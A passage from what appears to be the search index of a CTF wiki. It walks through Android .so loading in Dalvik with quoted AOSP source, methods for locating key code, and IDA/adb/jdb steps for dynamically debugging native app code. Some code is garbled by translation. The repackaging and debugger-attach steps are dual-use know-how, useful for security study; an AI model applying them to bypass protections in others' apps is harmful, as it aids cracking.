method.","title":"doLoad"},{"location":"android/basic_operating_mechanism/native_layer/so/#nativeload","text":"The nativeload function is actually a function of the native layer. // TODO: should be synchronized, but dalvik doesn't support synchronized internal natives. private static native String nativeLoad ( String filename , ClassLoader loader , String ldLibraryPath ); The corresponding file path is dalvik/vm/native/java_lang_Runtime.cpp , and the specific nativeLoad function is as follows const DalvikNativeMethod dvm_java_lang_Runtime [] = { { \"freeMemory\" , \"()J\" , Dalvik_java_lang_Runtime_freeMemory }, { & quot ; gc & quot ;, & quot ;() V & quot ;, Dalvik_java_lang_Runtime_gc }, { & quot ; maxMemory & quot ;, & quot ;() J & quot ;, Dalvik_java_lang_Runtime_maxMemory }, { \"nativeExit\" , \"(I)V\" , Dalvik_java_lang_Runtime_nativeExit }, { \"nativeLoad\" , \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\" , Dalvik_java_lang_Runtime_nativeLoad }, { & quot ; totalMemory & quot ;, & quot ;() J & quot ;, Dalvik_java_lang_Runtime_totalMemory }, { NULL , NULL , ZERO }, }; It can be seen that the function corresponding to the native layer is Dalvik_java_lang_Runtime_nativeLoad, as follows /* * static String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath) * * Load the specified full path as a dynamic library filled with * JNI-compatible methods. Returns null on success, or a failure * message on failure. */ static void Dalvik_java_lang_Runtime_nativeLoad ( const u4 * args , JValue * Director ) { StringObject * fileNameObj = ( StringObject * ) args [ 0 ]; Object * classLoader = ( Object * ) args [ 1 ]; StringObject * ldLibraryPathObj = ( StringObject * ) args [ 2 ]; assert ( fileNameObj != NULL ); char * fileName = dvmCreateCstrFromString ( fileNameObj ); if ( ldLibraryPathObj != NULL ) { char * ldLibraryPath = dvmCreateCstrFromString ( ldLibraryPathObj ); void * sym = dlsym ( RTLD_DEFAULT , \"android_update_LD_LIBRARY_PATH\" ); if ( sym != NULL ) { typedef void ( * Fn )( const char * ); Fn android_update_LD_LIBRARY_PATH = reinterpret_cast < Fn > ( sym ); ( * android_update_LD_LIBRARY_PATH )( ldLibraryPath ); } else { ALOGE ( \"android_update_LD_LIBRARY_PATH not found; .so dependencies will not work!\" ); } free ( ldLibraryPath ); } StringObject * result = NULL ; char * reason = NULL ; bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); if ( ! success ) { const char * msg = ( reason != NULL ) ? reason : \"unknown failure\" ; result = dvmCreateStringFromCstr ( msg ); dvmReleaseTrackedAlloc (( Object * ) result , NULL ); } free ( reason ); free ( fileName ); RETURN_PTR ( result ); } According to the comments, we can determine the key code at bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); After this line is executed, it will tell us whether the corresponding so is successful.","title":"nativeload"},{"location":"android/basic_operating_mechanism/native_layer/so/#dvmloadnativecode","text":"The basic code is as follows, we can simply judge the function of the function according to the comments: The program loads the corresponding native code according to the specified absolute path, but if the library is already loaded, it will not be loaded again. Also, as stated in JNI, we can't load a library into multiple class loaders, that is, a library will only be associated with a class loader. The basic execution flow of the function is as follows Use findSharedLibEntry to determine if the library has been loaded, and if it is already loaded, is the same class loader. /* * Load native code from the specified absolute pathname. Per the spec, * if we've already loaded a library with the specified pathname, we * return without doing anything. * * TODO? for better results we should absolutify the pathname. For fully * correct results we should stat to get the inode and compare that. The * existing implementation is fine so long as everybody is using * System.loadLibrary. * * The library will be associated with the specified class loader. The JNI * spec says we can't load the same library into more than one class loader. * * Returns \"true\" on success. On failure, sets *detail to a * human-readable description of the error or NULL if no detail is * available; ownership of the string is transferred to the caller. */ bool dvmLoadNativeCode ( const char * pathName , Object * classLoader , char ** detail ) { SharedLib * pEntry ; void * handle ; bool verbose ; /* reduce noise by not chattering about system libraries */ verbose = !! strncmp ( pathName , \"/system\" , sizeof ( \"/system\" ) -1 ); verbose = verbose && !! strncmp ( pathName , \"/vendor\" , sizeof ( \"/vendor\" ) -1 ); if ( verbose ) ALOGD ( \"Trying to load lib %s %p\" , pathName , classLoader ); * detail = NULL ; /* * See if we've already loaded it. If we have, and the class loader * matches, return successfully without doing anything. */ pEntry = findSharedLibEntry ( pathName ); if ( pEntry ! = NULL ) { if ( pEntry -> classLoader != classLoader ) { ALOGW ( \"Shared lib '%s' already opened by CL %p; can't open in %p\" , pathName , pEntry -> classLoader , classLoader ); return false ; } if ( verbose ) { ALOGD ( \"Shared lib '%s' already loaded in same CL %p\" , pathName , classLoader ); } if ( ! checkOnLoadResult ( pEntry )) return false ; return true ; } If it is not loaded, it will open the shared library with dlopen. /* * Open the shared library. Because we're using a full path, the system * doesn't have to search through LD_LIBRARY_PATH. (It may do so to * resolve this library's dependencies though.) * * Failures here are expected when java.library.path has several entries * and we have to hunt for the lib. * * The current version of the dynamic linker prints detailed information * about dlopen() failures. Some things to check if the message is * cryptic: * - make sure the library exists on the device * - verify that the right path is being opened (the debug log message * above can help with that) * - check to see if the library is valid (e.g. not zero bytes long) * - check config/prelink-linux-arm.map to ensure that the library * is listed and is not being overrun by the previous entry (if * loading suddenly stops working on a prelinked library, this is * a good one to check) * - write a trivial app that calls sleep() then dlopen(), attach * to it with \"strace -p <pid>\" while it sleeps, and watch for * attempts to open nonexistent dependent shared libs * * This can execute slowly for a large library on a busy system, so we * want to switch from RUNNING to VMWAIT while it executes. This allows * the GC to ignore us. */ Thread * self = dvmThreadSelf (); ThreadStatus oldStatus = dvmChangeStatus ( self , THREAD_VMWAIT ); handle = dlopen ( pathName , RTLD_LAZY ); dvmChangeStatus ( self , oldStatus ); if ( handle == NULL ) { * detail = strdup ( dlerror ()); ALOGE ( \"dlopen( \\\" %s \\\" ) failed: %s\" , pathName , * detail ); return false ; } The dlopen function ( bionic/linker/dlfcn.cpp ) is as follows void * dlopen ( const char * filename , int flags ) { ScopedPthreadMutexLocker locker ( & gDlMutex ); soinfo * result = do_dlopen ( filename , flags ); if ( result == NULL ) { __bionic_format_dlerror ( \"dlopen failed\" , linker_get_error_buffer ()); return NULL ; } return result ; } It will call the do_dlopen function ( bionic/linker/linker.cpp ) as follows soinfo * do_dlopen ( const char * name , int flags ) { if (( flags & ~ ( RTLD_NOW | RTLD_LAZY | RTLD_LOCAL | RTLD_GLOBAL )) != 0 ) { DL_ERR ( \"invalid flags to dlopen: %x\" , flags ); return NULL ; } set_soinfo_pool_protection ( PROT_READ | PROT_WRITE ); Soinfo * si = find_library ( name ); / / determine whether there is this library , if any , need to complete the initialization work if ( si != NULL ) { yes -& gt ; CallConstructors (); } set_soinfo_pool_protection ( PROT_READ ); if they return ; } After finding the corresponding library, si-&gt;CallConstructors(); will be used to construct the relevant information, as follows void soinfo :: CallConstructors () { if ( constructors_called ) { return ; } // We set constructors_called before actually calling the constructors, otherwise it doesn't // protect against recursive constructor calls. One simple example of constructor recursion // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so: // 1. The program depends on libc, so libc's constructor is called here. // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so. // 3. dlopen() calls the constructors on the newly created // soinfo for libc_malloc_debug_leak.so. // 4. The debug .so depends on libc, so CallConstructors is // called again with the libc soinfo. If it doesn't trigger the early- // out above, the libc constructor will be called again (recursively!). constructors_called = true ; if (( flags & FLAG_EXE ) == 0 && preinit_array != NULL ) { // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT ( \" \\\" %s \\\" : ignoring %d-entry DT_PREINIT_ARRAY in shared library!\" , name , preinit_array_count ); } if ( dynamic != NULL ) { for ( Elf32_Dyn * d = dynamic ; d -> d_tag != DT_NULL ; ++ d ) { if ( d -> d_tag == DT_NEEDED ) { const char * library_name = strtab + d -> d_un . d_val ; TRACE ( \" \\\" %s \\\" : calling constructors in DT_NEEDED \\\" %s \\\" \" , name , library_name ); Find_loaded_library ( library_name ) -& gt ; CallConstructors (); //Check if the library is loaded } } } TRACE ( \" \\\" %s \\\" : calling constructors\" , name ); // DT_INIT should be called before DT_INIT_ARRAY if both are present. CallFunction ( \"DT_INIT\" , init_func ); CallArray ( \"DT_INIT_ARRAY\" , init_array , init_array_count , false ); } As you can see, as the comment says, if the .init function and init_array exist, the program will in turn call the code in the corresponding position in the .init function and .init_array. Related instructions are as follows #define DT_INIT 12 /* Address of initialization function */ #define DT_INIT_ARRAY 25 /* Address of initialization function array */ Create an open shared library entry and try to add it to the corresponding list for easy management. If the join fails, it will be released. /* create a new entry */ SharedLib * pNewEntry ; pNewEntry = ( SharedLib * ) calloc ( 1 , sizeof ( SharedLib )); pNewEntry -> pathName = strdup ( pathName ); pNewEntry -> handle = handle ; pNewEntry -> classLoader = classLoader ; dvmInitMutex ( & pNewEntry -> onLoadLock ); pthread_cond_init ( & pNewEntry -> onLoadCond , NULL ); pNewEntry -> onLoadThreadId = self -> threadId ; /* try to add it to the list */ SharedLib * pActualEntry = addSharedLibEntry ( pNewEntry ); if ( pNewEntry ! = pActualEntry ) { ALOGI ( \"WOW: we lost a race to add a shared lib (%s CL=%p)\" , pathName , classLoader ); freeSharedLibEntry ( pNewEntry ); return checkOnLoadResult ( pActualEntry ); } If the loading is successful, dlsym will be used to get the JNI_OnLoad function in the corresponding so file. If the function exists, it will be called. Otherwise, it will return directly. else { if ( verbose ) ALOGD ( \"Added shared lib %s %p\" , pathName , classLoader ); bool result = false ; void * vonLoad ; int version ; vonLoad = dlsym ( handle , \"JNI_OnLoad\" ); if ( vonLoad == NULL ) { ALOGD ( \"No JNI_OnLoad found in %s %p, skipping init\" , pathName , classLoader ); result = true ; } else { /* * Call JNI_OnLoad. We have to override the current class * loader, which will always be \"null\" since the stuff at the * top of the stack is around Runtime.loadLibrary(). (See * the comments in the JNI FindClass function.) */ OnLoadFunc func = ( OnLoadFunc ) vonLoad ; Object * prevOverride = self -> classLoaderOverride ; self -> classLoaderOverride = classLoader ; oldStatus = dvmChangeStatus ( self , THREAD_NATIVE ); if ( gDvm . verboseJni ) { ALOGI ( \"[Calling JNI_OnLoad for \\\" %s \\\" ]\" , pathName ); } version = ( * func )( gDvmJni . jniVm , NULL ); dvmChangeStatus ( self , oldStatus ); self -> classLoaderOverride = prevOverride ; if ( version == JNI_ERR ) { * detail = strdup ( StringPrintf ( \"JNI_ERR returned from JNI_OnLoad in \\\" %s \\\" \" , pathName ). c_str ()); } else if ( dvmIsBadJniVersion ( version )) { * detail = strdup ( StringPrintf ( \"Bad JNI version returned from JNI_OnLoad in \\\" %s \\\" : %d\" , pathName , version ). c_str ()); /* * It's unwise to call dlclose() here, but we can mark it * as bad and ensure that future load attempts will fail. * * We don't know how far JNI_OnLoad got, so there could * be some partially-initialized stuff accessible through * newly-registered native method calls. We could try to * unregister them, but that doesn't seem worthwhile. */ } else { result = true ; } if ( gDvm . verboseJni ) { ALOGI ( \"[Returned %s from JNI_OnLoad for \\\" %s \\\" ]\" , ( result ? \"successfully\" : \"failure\" ), pathName ); } } if ( result ) pNewEntry -> onLoadResult = kOnLoadOkay ; else pNewEntry -> onLoadResult = kOnLoadFailed ; pNewEntry -> onLoadThreadId = 0 ; /* * Broadcast a wakeup to anybody sleeping on the condition variable. */ dvmLockMutex ( & pNewEntry -> onLoadLock ); pthread_cond_broadcast ( & pNewEntry -> onLoadCond ); dvmUnlockMutex ( & pNewEntry -> onLoadLock ); return result ; } }","title":"dvmLoadNativeCode"},{"location":"android/basic_operating_mechanism/native_layer/so/#to-sum-up","text":"This means that when the .so file is loaded, it will follow the function in the following order (if it doesn't exist, it will be skipped) .init function Functions in .init_array JNI_OnLoad function","title":"to sum up"},{"location":"android/basic_reverse/android_code_location/","text":"Android key code positioning \u00b6 AndroidManifest.xml file package name Apk main activity, hidden program without main activity Application is the earliest in the java layer, Sequence Analysis \u00b6 The most common and useful method is that we follow the logic of the program to view the code of the program for analysis, but when the program code is particularly large, the efficiency of this method is relatively low, and other methods are needed to assist. String positioning method \u00b6 The so-called string positioning method is to locate the corresponding function by the string that appears during the running of the program. Strings may be hard-coded directly into the program, or they may be indexed by the string id. This method is convenient to use, but now, it is possible that the string will be separated or first encrypted and decrypted dynamically during the running process. Strings we might be interested in may have Program error message Service Broadcast Sensitive API positioning \u00b6 The so-called sensitive API positioning method means that we determine which functions the program may call based on the execution behavior of the program. This method requires us to be familiar with the API in Android. In general, we may focus on the following aspects Control event function onclick show Toast Network function HttpGet HttpPost HttpUriRequest socket send messages Call Positioning and many more log\u4fe1\u606f \u00b6 The so-called log information is the string information output by the Android program at runtime. This part of the information will not be reflected in our interface. Therefore, we need to use other auxiliary tools to analyze. For example, we can use ddms to assist the analysis. For log information, we can consider two aspects Use the log information generated by the program itself Decompile the code yourself, insert the log information, and repackage it for analysis. Stack Tracking \u00b6 We can use the method provided by ddms to call the chain information to determine the current calling relationship of the program. hook \u00b6 xposed cydia monitor \u00b6 Run log, generated by the program, generated by the system Thread tracing Method call chain Dynamic debugging \u00b6","title":"Android Key Part Location"},{"location":"android/basic_reverse/android_code_location/#android-key-code-positioning","text":"AndroidManifest.xml file package name Apk main activity, hidden program without main activity Application is the earliest in the java layer,","title":"Android key code positioning"},{"location":"android/basic_reverse/android_code_location/#sequence-analysis","text":"The most common and useful method is that we follow the logic of the program to view the code of the program for analysis, but when the program code is particularly large, the efficiency of this method is relatively low, and other methods are needed to assist.","title":"Sequence Analysis"},{"location":"android/basic_reverse/android_code_location/#string-positioning-method","text":"The so-called string positioning method is to locate the corresponding function by the string that appears during the running of the program. Strings may be hard-coded directly into the program, or they may be indexed by the string id. This method is convenient to use, but now, it is possible that the string will be separated or first encrypted and decrypted dynamically during the running process. Strings we might be interested in may have Program error message Service Broadcast","title":"String positioning method"},{"location":"android/basic_reverse/android_code_location/#sensitive-api-positioning","text":"The so-called sensitive API positioning method means that we determine which functions the program may call based on the execution behavior of the program. This method requires us to be familiar with the API in Android. In general, we may focus on the following aspects Control event function onclick show Toast Network function HttpGet HttpPost HttpUriRequest socket send messages Call Positioning and many more","title":"Sensitive API positioning"},{"location":"android/basic_reverse/android_code_location/#log","text":"The so-called log information is the string information output by the Android program at runtime. This part of the information will not be reflected in our interface. Therefore, we need to use other auxiliary tools to analyze. For example, we can use ddms to assist the analysis. For log information, we can consider two aspects Use the log information generated by the program itself Decompile the code yourself, insert the log information, and repackage it for analysis.","title":"log\u4fe1\u606f"},{"location":"android/basic_reverse/android_code_location/#stack-tracking","text":"We can use the method provided by ddms to call the chain information to determine the current calling relationship of the program.","title":"Stack Tracking"},{"location":"android/basic_reverse/android_code_location/#hook","text":"xposed cydia","title":"hook"},{"location":"android/basic_reverse/android_code_location/#monitor","text":"Run log, generated by the program, generated by the system Thread tracing Method call chain","title":"monitor"},{"location":"android/basic_reverse/android_code_location/#dynamic-debugging","text":"","title":"Dynamic debugging"},{"location":"android/basic_reverse/overview/","text":"Android Reverse Basic Introduction \u00b6 First, we need to clarify the purpose of Android reverse: I want to analyze the function of the program . Then we naturally have two aspects (methods and objects) that can be considered Analytical methods can be used in the following ways Static analysis, reverse the source code, then read the analysis Dynamic analysis, dynamic debugging of code, in general dynamic analysis is inseparable from static analysis. Analysis objects, generally have the following two types of objects java, layer code Native layer code It is not difficult to see that in order to analyze Android applications, the basic knowledge of the Java layer and the knowledge of the native layer are still necessary. Currently, Android reverse is mainly used in the following directions. app security review System vulnerability mining Malicious code killing Analysis of product technology principles in the same industry Remove security mechanisms","title":"Brief Overview"},{"location":"android/basic_reverse/overview/#android-reverse-basic-introduction","text":"First, we need to clarify the purpose of Android reverse: I want to analyze the function of the program . Then we naturally have two aspects (methods and objects) that can be considered Analytical methods can be used in the following ways Static analysis, reverse the source code, then read the analysis Dynamic analysis, dynamic debugging of code, in general dynamic analysis is inseparable from static analysis. Analysis objects, generally have the following two types of objects java, layer code Native layer code It is not difficult to see that in order to analyze Android applications, the basic knowledge of the Java layer and the knowledge of the native layer are still necessary. Currently, Android reverse is mainly used in the following directions. app security review System vulnerability mining Malicious code killing Analysis of product technology principles in the same industry Remove security mechanisms","title":"Android Reverse Basic Introduction"},{"location":"android/basic_reverse/dynamic/dynamic_debug/","text":"Android dynamic debugging \u00b6 Android Debugging Basics \u00b6 In general, Android determines whether an application can be debugged according to the following order. Check if the ro.debuggable in boot.img is 1, and if it is 1, any application in the phone can be debugged. Otherwise, detect the corresponding application in AndroidManifest.xml <application> Whether the element contains android:debuggable=\"true\", if any, will enable debugging support. Naturally, we have two ways to make an application debugged. Unpack an apk file, at <application> Add android:debuggable=\"true\" to the element, then repackage and sign. Modify the ro.debuggable in boot.img to 1. Generally speaking, because the former requires us to modify the application every time, it is more troublesome, we prefer the latter. For the latter, we need the root phone and brush in the relevant image. ( !! Find a suitable article!! ) In addition, the emulator generated by Andoird AVD is set to 1 by default with ro.debuggable. The value of ro.debuggable can be queried according to the following command: adb shell getprop ro.debuggable Basic Debugging Tools \u00b6 DDMS \u00b6 DDMS (Dalvik Debug Monitor Service) is the Dalvik virtual machine debugging monitoring service, which can monitor the status and results of Android programs during operation, which can greatly speed up the efficiency of our program analysis. This is a tool provided by the Android SDK, which has a device screen capture, view running thread information, file browsing, Logcat, Method Profiling, broadcast status information, analog phone calls, receiving SMS and other functions. This tool is generally located in the tools directory of the Android SDK, where ddms.bat is used to start DDMS. The more important functions in DDMS are mainly File browsing, we can observe and analyze the program's generation, modification, and deletion of files during execution. Logcat, which can output some debugging information of the software. Method Profiling, which tracks the execution flow of the program. IDEA/Android Studio \u00b6 Install the smaliidea plugin to dynamically debug smali. IDA Pro \u00b6 I love to crack.","title":"Dynamic Debugging"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#android-dynamic-debugging","text":"","title":"Android dynamic debugging"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#android-debugging-basics","text":"In general, Android determines whether an application can be debugged according to the following order. Check if the ro.debuggable in boot.img is 1, and if it is 1, any application in the phone can be debugged. Otherwise, detect the corresponding application in AndroidManifest.xml <application> Whether the element contains android:debuggable=\"true\", if any, will enable debugging support. Naturally, we have two ways to make an application debugged. Unpack an apk file, at <application> Add android:debuggable=\"true\" to the element, then repackage and sign. Modify the ro.debuggable in boot.img to 1. Generally speaking, because the former requires us to modify the application every time, it is more troublesome, we prefer the latter. For the latter, we need the root phone and brush in the relevant image. ( !! Find a suitable article!! ) In addition, the emulator generated by Andoird AVD is set to 1 by default with ro.debuggable. The value of ro.debuggable can be queried according to the following command: adb shell getprop ro.debuggable","title":"Android Debugging Basics"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#basic-debugging-tools","text":"","title":"Basic Debugging Tools"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ddms","text":"DDMS (Dalvik Debug Monitor Service) is the Dalvik virtual machine debugging monitoring service, which can monitor the status and results of Android programs during operation, which can greatly speed up the efficiency of our program analysis. This is a tool provided by the Android SDK, which has a device screen capture, view running thread information, file browsing, Logcat, Method Profiling, broadcast status information, analog phone calls, receiving SMS and other functions. This tool is generally located in the tools directory of the Android SDK, where ddms.bat is used to start DDMS. The more important functions in DDMS are mainly File browsing, we can observe and analyze the program's generation, modification, and deletion of files during execution. Logcat, which can output some debugging information of the software. Method Profiling, which tracks the execution flow of the program.","title":"DDMS"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ideaandroid-studio","text":"Install the smaliidea plugin to dynamically debug smali.","title":"IDEA/Android Studio"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ida-pro","text":"I love to crack.","title":"IDA Pro"},{"location":"android/basic_reverse/dynamic/ida_native_debug/","text":"IDA Dynamically Debugging Native Layer Programs \u00b6 Here we will introduce how to debug the following types of programs. Basic native layer program, a simple C/C++ program. Native so program Essential Tools \u00b6 already rooted phone IDA Fundamental \u00b6 When using ida to dynamically debug native layer programs, the android_server program is mainly used. The program is injected into the program to be debugged using ptrace technology. Each process has a status file with a field TracerPid that identifies which process the process is ptrace to. If it is not ptrace by other processes, it returns 0, otherwise it returns the pid of the corresponding process. Basic environment construction \u00b6 No matter what native layer program is debugged, the basic environment is similar. You need to ensure that IDA communicates with the phone normally. Upload the android_server file (under ida's dbgsrv folder) and modify the permissions to make it executable adb push android_server /data/local/tmp/ adb shell chmod 755 /data/local/tmp/android_server Open android_server, which will listen on port 23946 (running as root) Adb shell # Enter adb Su # switch root ./data/local/tmp/android_server #Start android_server Establish communication between the local computer 23496 port and the mobile phone port 23946. When the PC has a client connection to port 23946, the information it sends will be forwarded to the corresponding port on the phone, and android_server will receive the corresponding data, allowing IDA to debug the program. The port of the previous tcp refers to the port of the local PC, and the latter refers to the port of the mobile phone. adb forward tcp:23946 tcp:23946 note: > In fact, this connection establishes communication between the adb server and the adbd on the phone. So its communication is probably like this IDA\u2194adb server<--->adbd<---->android_server > computer | mobile phone Among them, the first step only needs to be executed once, and you don't need to execute it again later. Steps 2-3 have to be executed each time, so you can write a script and place the script's path under the system's path environment variable so that we can execute a command directly. Basic native program debugging - Method 1 \u00b6 A basic native program refers to a normal c/c++ program compiled into arm assembly. Adding a program \u00b6 Here we take the debugnativeapp in http://www.52pojie.cn/thread-554068-1-1.html as an example. First, we need to put the native program on the android device and modify its permissions so that it can be executed. as follows adb push debugnativeapp /data/local/tmp/ adb shell chmod 755 /data/local/tmp/debugnativeapp Start debugging \u00b6 Select the appropriate ida according to the number of bits in the native layer program, then select Debugger-Run-RemoteArmLinux/Android debugger, the following interface Among them, the important parameters are as follows Application The absolute path of the program being debugged on the phone. Directory The directory of the debugged program in the phone Hostname That is, which host we communicate with, here we communicate directly with the local PC. The Debug options are selected as follows Mainly selected three events, so that our program can be automatically stopped at the entry point, when the thread starts, when the library is loaded. Of course, you can also choose. After starting the program, as follows Note: > 1. If you find that you can not load plugin, it may be that the phone does not have root. > 2. If you encounter the following problems, just cancel it. The specific reasons are not clear. > 3. If you encounter error: only position independent executables (PIE) are supported. Generally because the version of android phone is greater than 5, you can try > - Use the PIE version of android_server > - Use 010Editor to change the e_type in the elf header field in the header of the executable ELF file to ET_DYN(3). so native program debugging \u00b6 For so native programs, we might wonder what is different from ordinary native programs? Naturally there are, so files cannot be run separately. Usually some other programs call some basic functions in the so file. So here we can't directly use the above run method. In general, the so files in android are dependent on the apk file. Here we take debugjniso.apk in http://www.52pojie.cn/thread-554068-1-1.html as an example. First, you must build a basic debugging environment. Installer \u00b6 First, we need to install the apk on the phone. adb install debugjniso.apk Debug mode startup app \u00b6 Secondly, we need to start the program in debug mode , so that IDA can easily capture the corresponding program and attach it. ```shell adb shell am start -D -n packagename/.MainActivity ``` attach program \u00b6 Start IDA pro, click Debugger-Attach-RemoteArmLinux/Android debugger, Hostname fills in localhost, port defaults to port 23946. In fact, it is the listening port of our local computer. as follows Click ok to start debugging note: > If only one program /bin/sh can be attached at the end, it means that the android_server program is not running with root privileges. Use ctrl+f to quickly locate and select the corresponding process, as follows Then ok OK. At this point we can see that we have attached success. At this time, we click Debugger-Debugger options again, and the related options are as follows: The meaning is similar to the native program. > Why do you choose to set the corresponding breakpoint at this time? Because if you set it at the beginning of the attach, there is actually no such thing here. Everyone can try. Resume app execution \u00b6 At this time, the interface of the app is wait for debugger, and we have attached it. At this time, you need to let the program continue to run. First, we open ddms to select the process we want to debug. This is actually equivalent to direct execution. # Display all user processes available for debugging on the phone adb jdwp # Establish a connection between the xxx port of the PC and the corresponding port of the mobile phone to facilitate communication adb forward tcp:xxx jdwp:<pid> The reason why we don't use the command to execute is because we have to determine the process number of our apk ourselves, which is more troublesome. Here is a basic communication process At this point, our computer has established communication with the app's app virtual machine. At the same time, we need to use jdb in the java layer to attach our apk application to our computer, here we use the following command. jdb -connect com.sun.jdi.SocketAttach:hostname = localhost,port = xxx Where xxx is the 8700 port we saw in ddms, the default is this. After execution C: \\U sers \\i romise \u03bb jdb.bat jdb -connect com.sun.jdi.SocketAttach:hostname = 127 .0.0.1,port = 8700 Set uncaught java.lang.Throwable Set delayed uncaught java.lang.Throwable Initializing jdb... > Let\u2019s take a look at our mobile phone again. At this point, the application has continued to run, no longer the previous wait for debugger. Determining the native function address \u00b6 Here we open an ida again, import the sok of the apk, and then look for our function in export, as follows It can be seen that the offset is 0xc38. We then run F9 in the previous debug IDA until it is no longer running, we will see the program break at the linker At this point, we click on the app's interface to set the title button (the reason to press this, because the native API is called in the function), observe the IDA again, you can see that the so library has been loaded into B3B05000: loaded /data/app/com.droider.debugjniso-1/oat/arm/base.odex B39B9000: loaded /system/lib/hw/gralloc.msm8974.so B39B2000: loaded /system/lib/libmemalloc.so B39AA000: loaded /system/lib/libqdutils.so B3B00000: loaded /data/app/com.droider.debugjniso-1/lib/arm/libdebugjniso.so At this point, we use ctrl+s to locate 0xB3B00000 at the starting address of the library. Then according to Absolute address = base address + relative offset Get the address of the jnistring. Observation results \u00b6 Press g, then type +0xC38 and click ok to jump to the function libdebugjniso.so:B3B00C38 Java_com_droider_debugjniso_TestJniMethods_jniString libdebugjniso.so:B3B00C38 LDR R1, =(unk_B3B02148 - 0xB3B00C4C) libdebugjniso.so:B3B00C3C STMFD SP!, {R4,LR} libdebugjniso.so:B3B00C40 LDR R3, [R0] libdebugjniso.so:B3B00C44 ADD R1, PC, R1 ; unk_B3B02148 libdebugjniso.so:B3B00C48 MOV LR, PC We breakpoints at the beginning of this function, F2, and then execute the program again with F9. While watching the phone, we can see that the title of the app has changed to Hello! Nativemethod . At this point, the basic debugging steps of the so native program are over. Note: > If there is an add map dialog box in the middle, click Cancel, then apply. Precautions \u00b6 When using the simulator to debug an apk exception, it is very likely that the application has detected whether it is running in the simulator environment, consider using a mobile phone. When using the real machine debugging apk, it is also possible to encounter an exception, stuck in a certain instruction, then we can manually execute this instruction, and then set the PC to the address of the next instruction. Basic native program debugging - Method 2 \u00b6 To be added. Multithreaded debugging \u00b6 \u53c2\u8003\u9605\u8bfb \u00b6 http://www.52pojie.cn/thread-554068-1-1.html https://www.kanxue.com/chm.htm?id=10296&pid=node1000944","title":"Android Dynamic Debugging SO"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#ida-dynamically-debugging-native-layer-programs","text":"Here we will introduce how to debug the following types of programs. Basic native layer program, a simple C/C++ program. Native so program","title":"IDA Dynamically Debugging Native Layer Programs"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#essential-tools","text":"already rooted phone IDA","title":"Essential Tools"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#fundamental","text":"When using ida to dynamically debug native layer programs, the android_server program is mainly used. The program is injected into the program to be debugged using ptrace technology. Each process has a status file with a field TracerPid that identifies which process the process is ptrace to. If it is not ptrace by other processes, it returns 0, otherwise it returns the pid of the corresponding process.","title":"Fundamental"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#basic-environment-construction","text":"No matter what native layer program is debugged, the basic environment is similar. You need to ensure that IDA communicates with the phone normally. Upload the android_server file (under ida's dbgsrv folder) and modify the permissions to make it executable adb push android_server /data/local/tmp/ adb shell chmod 755 /data/local/tmp/android_server Open android_server, which will listen on port 23946 (running as root) Adb shell # Enter adb Su # switch root ./data/local/tmp/android_server #Start android_server Establish communication between the local computer 23496 port and the mobile phone port 23946. When the PC has a client connection to port 23946, the information it sends will be forwarded to the corresponding port on the phone, and android_server will receive the corresponding data, allowing IDA to debug the program. The port of the previous tcp refers to the port of the local PC, and the latter refers to the port of the mobile phone. adb forward tcp:23946 tcp:23946 note: > In fact, this connection establishes communication between the adb server and the adbd on the phone. So its communication is probably like this IDA\u2194adb server<--->adbd<---->android_server > computer | mobile phone Among them, the first step only needs to be executed once, and you don't need to execute it again later. Steps 2-3 have to be executed each time, so you can write a script and place the script's path under the system's path environment variable so that we can execute a command directly.","title":"Basic environment construction"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#basic-native-program-debugging-method-1","text":"A basic native program refers to a normal c/c++ program compiled into arm assembly.","title":"Basic native program debugging - Method 1"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#adding-a-program","text":"Here we take the debugnativeapp in http://www.52pojie.cn/thread-554068-1-1.html as an example. First, we need to put the native program on the android device and modify its permissions so that it can be executed. as follows adb push debugnativeapp /data/local/tmp/ adb shell chmod 755 /data/local/tmp/debugnativeapp","title":"Adding a program"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#start-debugging","text":"Select the appropriate ida according to the number of bits in the native layer program, then select Debugger-Run-RemoteArmLinux/Android debugger, the following interface Among them, the important parameters are as follows Application The absolute path of the program being debugged on the phone. Directory The directory of the debugged program in the phone Hostname That is, which host we communicate with, here we communicate directly with the local PC. The Debug options are selected as follows Mainly selected three events, so that our program can be automatically stopped at the entry point, when the thread starts, when the library is loaded. Of course, you can also choose. After starting the program, as follows Note: > 1. If you find that you can not load plugin, it may be that the phone does not have root. > 2. If you encounter the following problems, just cancel it. The specific reasons are not clear. > 3. If you encounter error: only position independent executables (PIE) are supported. Generally because the version of android phone is greater than 5, you can try > - Use the PIE version of android_server > - Use 010Editor to change the e_type in the elf header field in the header of the executable ELF file to ET_DYN(3).","title":"Start debugging"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#so-native-program-debugging","text":"For so native programs, we might wonder what is different from ordinary native programs? Naturally there are, so files cannot be run separately. Usually some other programs call some basic functions in the so file. So here we can't directly use the above run method. In general, the so files in android are dependent on the apk file. Here we take debugjniso.apk in http://www.52pojie.cn/thread-554068-1-1.html as an example. First, you must build a basic debugging environment.","title":"so native program debugging"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#installer","text":"First, we need to install the apk on the phone. adb install debugjniso.apk","title":"Installer"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#debug-mode-startup-app","text":"Secondly, we need to start the program in debug mode , so that IDA can easily capture the corresponding program and attach it. ```shell adb shell am start -D -n packagename/.MainActivity ```","title":"Debug mode startup app"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#attach-program","text":"Start IDA pro, click Debugger-Attach-RemoteArmLinux/Android debugger, Hostname fills in 